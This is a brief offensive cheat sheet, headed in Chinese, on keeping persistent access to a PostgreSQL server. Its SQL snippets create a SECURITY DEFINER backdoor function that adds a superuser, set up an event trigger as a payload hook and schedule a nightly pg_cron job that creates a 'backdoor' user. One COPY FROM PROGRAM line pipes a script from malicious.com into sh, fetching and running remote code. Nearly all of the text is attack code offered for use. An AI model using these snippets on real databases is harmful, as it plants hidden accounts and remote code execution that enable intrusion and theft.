## 持久化

### 创建持久化函数

```sql
CREATE OR REPLACE FUNCTION backdoor_func()
RETURNS void AS $$
BEGIN
  -- Payload
  -- This could be something like creating a new superuser.
  CREATE ROLE persist_user WITH LOGIN SUPERUSER PASSWORD 'secret';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

### 事件触发器

```sql
CREATE OR REPLACE FUNCTION ddl_audit_func()
RETURNS event_trigger AS $$
BEGIN
   -- Payload goes here
   INSERT INTO audit.log (action) VALUES ('DDL command executed');
END;
$$ LANGUAGE plpgsql;

CREATE EVENT TRIGGER ddl_audit_trigger
ON ddl_command_end
EXECUTE FUNCTION ddl_audit_func();
```

### pg_cron 计划作业

```sql
SELECT cron.schedule('0 0 * * *', $$CREATE USER backdoor WITH PASSWORD 'mypassword'$$);
```

### 滥用 COPY FROM PROGRAM

```sql
COPY localtable FROM PROGRAM 'curl http://malicious.com/shell.sh | sh';
```

### 修改启动程序

更改pg_service.conf文件内容即可
